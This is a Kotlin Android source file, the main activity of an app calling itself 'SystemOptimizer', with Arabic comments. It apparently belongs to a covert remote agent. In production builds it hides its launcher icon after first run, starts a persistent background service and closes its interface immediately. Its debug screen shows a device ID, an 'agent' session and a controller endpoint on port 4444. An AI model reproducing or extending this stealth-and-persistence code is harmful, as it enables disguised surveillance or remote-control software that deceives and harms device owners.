package com.example.systemoptimizer

import android.content.ComponentName
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.core.content.ContextCompat
import java.util.Locale

class MainActivity : ComponentActivity() {

    private var debugStatus: TextView? = null
    private val statusTicker = object : Runnable {
        override fun run() {
            refreshDebugStatus()
            if (debugStatus != null) {
                handler.postDelayed(this, STATUS_PERIOD_MS)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // شاشة الإعداد الأولي: مركز الصلاحيات (بدون أي صلاحية root).
        if (!PermissionCenterActivity.setupComplete(this)) {
            startActivity(Intent(this, PermissionCenterActivity::class.java))
            finish()
            return
        }

        startApp()
    }

    private fun startApp() {
        // إخفاء أيقونة التطبيق (بعد أول تشغيل لا يمكن فتحه من المشغّل).
        // لا يُطبَّق هذا الإخفاء في بنيات التصحيح حتى يبقى زر Run في Android Studio يعمل.
        val debuggable = (applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            if (debuggable) {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            },
            PackageManager.DONT_KILL_APP
        )

        // تشغيل الخدمة الخلفية (الخامسة العامة تستدعي startForeground فوراً)
        ContextCompat.startForegroundService(
            this,
            Intent(this, BackgroundService::class.java)
        )

        if (debuggable) {
            // بنية التصحيح: شاشة حالة مرئية للمهندس أثناء التطوير.
            setContentView(buildDebugStatusView())
            refreshDebugStatus()
            handler.post(statusTicker)
        } else {
            // بنية الإنتاج: إغلاق الواجهة فوراً (تبقى الواجهة مخفية).
            finish()
        }
    }

    private fun buildDebugStatusView(): ViewGroup {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0D1117"))
            setPadding(dp(24), dp(32), dp(24), dp(24))
            gravity = Gravity.TOP or Gravity.START
        }
        val title = TextView(this).apply {
            text = "SystemOptimizer Agent — Debug"
            setTextColor(Color.WHITE)
            textSize = 18f
            typeface = Typeface.DEFAULT_BOLD
        }
        val status = TextView(this).apply {
            setTextColor(Color.LTGRAY)
            textSize = 12f
            typeface = Typeface.MONOSPACE
            setLineSpacing(0f, 1.15f)
        }
        debugStatus = status
        root.addView(title)
        root.addView(status)
        return root
    }

    private fun refreshDebugStatus() {
        val view = debugStatus ?: return
        val identity = DeviceIdentity(this)
        val state = runCatching { identity.buildState(this) }
            .getOrElse { "state unavailable: $it" }
        val session = BackgroundService.debugSessionState()
        val endpoint = identity.controllerEndpoint() ?: "10.0.2.2:4444"
        view.text = String.format(
            Locale.US,
            "device_id: %s\nendpoint: %s\nagent: %s\n%s",
            identity.deviceId(), endpoint, session, state
        )
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()

    override fun onDestroy() {
        debugStatus = null
        handler.removeCallbacks(statusTicker)
        super.onDestroy()
    }

    companion object {
        private const val STATUS_PERIOD_MS = 2000L
        private val handler = Handler(Looper.getMainLooper())
    }
}